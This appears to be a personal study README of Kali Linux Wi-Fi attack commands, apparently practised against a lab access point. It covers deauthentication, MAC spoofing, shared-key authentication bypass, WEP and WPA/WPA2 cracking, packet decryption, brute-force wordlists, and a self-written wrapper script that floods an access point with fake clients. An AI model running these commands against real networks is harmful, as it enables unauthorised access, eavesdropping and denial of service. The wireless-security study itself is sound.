# Wireless Basics in Kali Linux

*ip link* to view the wireless devices and confirm the card has been detected

*iw dev ap stop/start* start or stop an access point - verify by running *ip link* and look for *UP*

*ip link set <device> up/down* e.g. *ip link set wlan0 up* - bring wireless card up

*airmon-ng* to verify it detects the card

*airmon-ng check* to check for proccesses that could cause trouble

*airmon-ng check kill* to kill those processes

*airmon-ng start/stop <device>* to put device in monitor mode - check with *airmon-ng*

*service NetworkManager start* to restart the network manager (got killed by airmon-ng)

*service wpa_supplicant start* to restart the wpa supplicant (got killed by aimon-ng)

# Find out hidden SSID

1. Wait for legitimate ProbeRequest and read out SSID or

2. Find out MAC-Address and launch a deauthentication attack to force the clients to reconnect and send a Probe Package. *sudo aireplay-ng -0 5 -a 3C:84:6A:DF:AB:7C --ignore-negative wlan0mon*.
*-0* is the deathtentication attack, 5 is the number of deauthentication packets to send and -a specifies the MAC address.

3. Put this filter in Wireshark to see all the non-Beacon traffic going to and from the access point:
*(wlan.bssid == <MAC>) && !(wlan.fc.type_subtype == 0x08)*

# Orient in Network + find out MAC and Device type
*sudo airodump-ng wlan0mon* - captures current networks and clients in the area, requires mon mode

Navigate through the different filters by pressing the key *a*. To look up a device e.g. go to *sta only* and then copy the first 3 hex fields e.g. "E8:FD:F8" and paste it into *https://www.wireshark.org/tools/oui-lookup.html*, in this case it says Shanghai High-Flying Electronics Technology Co., Ltd.

In Airodump press *TAB* to select a certain AP and then the arrow keys to navigate. Now press *m* to mark certain AP with a color. Now all the clients connected to this AP have the same color as well.

*s* key to sort by attributes like signal strength or MAC addr.

*sudo airodump-ng wlan0mon -w output* to create multiple output files to analyze

# Airgraph-ng - Visualize Network Topology captured by Airdump-ng

Run *sudo airgraph-ng -i test-01.csv -o capture.png -g CAPR* to pass the file *test-01.csv* into airgraph-ng and put the output in *capture.png*. -g is the type of the graph output, in this case client access point relationship.

Other options are *-g CPG* for common probe graph to see probe requests

# How to beat MAC Filters

run airodump-ng to find a whitlisted MAC and spoof it. 

*sudo airodump-ng -c 3 -a --bssid 3C:84:6A:DF:AB:7C wlan0mon* -> found: A8:93:4A:F2:C1:7D 

*sudo ifconfig wlan0 down*

run *sudo macchanger -m A8:93:4A:F2:C1:7D wlan0* to change the MAC and connect to the network

*sudo ifconfig wlan0 up* again, *sudo iwconfig wlan0 essid "Wireless Lab"* -> check if it works by running iwconfig wlan0

# Bypass Shared Authentication

Sniff packets between AP and client: 

sudo airodump-ng wlan0mon --bssid 3C:84:6A:DF:AB:7C --channel 11 --write keystream

Either wait for them to connect to the AP or force a reconnect.
Then there should be something in the AUTH column of the airodump window, for me it was "SKA", the reference book states "WEP" should be there. 

After we collected the shared authentication exchange we can run 
*sudo aireplay-ng -1 0 -e "Wireless Lab" -y keystream-01-3C-84-6A-DF-AB-7C.xor -a 3C:84:6A:DF:AB:7C -h AA:AA:AA:AA:AA:AA wlan0mon* to fake the shared authentication and connect to the client.

Also I coded a wrapper for the aireplay-ng programm to run this bypass multiple times with randomly generated SSIDs. When the client count is reached, the AP won't accept new clients essentially ddosing the AP.
To run the script follow these commands:
*chmod +x ddoswrapper.sh* making the script executable
*sudo ./ddoswrapper.sh --ssid "AA:AA:AA:AA:AA:AA" --attempts 100* default attempts are 50.
Have fun :D

# How to crack WEP

run *airodump-ng wlan0mon* to find out the MAC address of the target router and the channel its operating in. 

Then run *sudo airodump-ng -c 3 -a --bssid 3C:84:6A:DF:AB:7C wlan0mon --write WEPDemo* with -c set to the channel, in this case 11 and bssid to the MAC of the router.

Now connect to the router with fake authentication or wait till someone else does, because the access point will only accept packets from associated clients. airodump-ng should show the connected client(s). Never worked with that?

Replay ARP packets using*sudo aireplay-ng -3 -b 3C:84:6A:DF:AB:7C -h a8:93:4a:f2:c1:7d --ignore-negative-one wlan0mon* -h is one of the associated clients of the AP b is the MAC of the AP.

Now just run *aircrack-ng WEPDemo-02.cap* to crack the key using the data collected by airodump-ng. This depends on the network speed and the key strength but shouldn't take much longer then 5-10 minutes.

# How to crack WPA/WPA2 networks which are using PSK

run *airodump-ng wlan0mon* to find out the MAC address of the target router and the channel its operating in. 

Then run *airodump-ng -c 5 -a --bssid 3C:84:6A:DF:AB:7C wlan0mon --write WPACrackingDemo* with -c set to the channel, in this case 11 and bssid to the MAC of the router.

Now we force the other clients to reconnect or wait till someone connects. run *aireplay-ng --deauth 1 -a 3C:84:6A:DF:AB:7C wlan0mon --ignore-negative-one*. Now if the *Auth* section of airodump reads *PSK*, we can stop airodump, otherwise retry.

Crack the file using aircrack utility with the command *aircrack-ng Wsudo aircrack-ng WPACrackingDemo-01.cap -w /usr/share/wordlists/nmap.lst* using our captured .cap file and a wordlist preinstalled from kali. (Important, the worldlist is everything here so optimizing it for the region you are in or including know information is a good idea.)

Of course in this example it will find the key since we included it in the wordlist but it only works if the key is in the wordlist!

# Speeding up the cracking process

The calculation of the Pre-Shared key using the PSK passphrase and the SSID through the PBKDF2 is very time/CPU consuming. The next step, which uses the key along with the parameters in the four-way handshake and verifying it against the MIC in the handshake is inexpensive and has different parameters everytime so we cannot precompute it. So we try to speed up the PSK (also called the Pairwise Master Key(PMK)) calculation as much as possible. 

Precalculate the PMK for a give SSID and worklist using *genpmk*. Run *sudo genpmk -f /usr/share/wordlists/nmap.lst -d PMK-WirelessLab -s "Wireless Lab"*

Now crack the WPA/WPA2 passphrase using a different tool for variety cowpatty.
Run *cowpatty -d PMK-WirelessLab -s "Wireless Lab" -r WPACrackingDemo-01.cap*

# Decrypting WPA packets

Use *airedecap-ng* to decrypt packages we captured. Run *sudo airdecap-ng -p abcdefgh -e "Wireless Lab" WPACrackingDemo-01.cap*

Now the decrypted packages are stored in *WPACrackingDemo-01-dec.cap* and can be analyzed using
Wireshark or sth like *tshark*. E.g. *tshark -r WPACrackingDemo-01-dec.cap *

# Use Hydra to crack HTTP authentication

In this case we generate a wordlist first to brute-force the password.
Run *sudo crunch 8 8 abcdefghi -o testWordlist.txt* to create a wordlist containing from 8 to 8  characters all possible combinations of the letters abcdefghi and writes it in the specified file. 

After this it gets a little tricky since we need to analyze the webpage in order to understand how it processes the password. We need to know if it is a POST or a GET request and alter the options accordingly. For this inspect the network tab in the browser. 





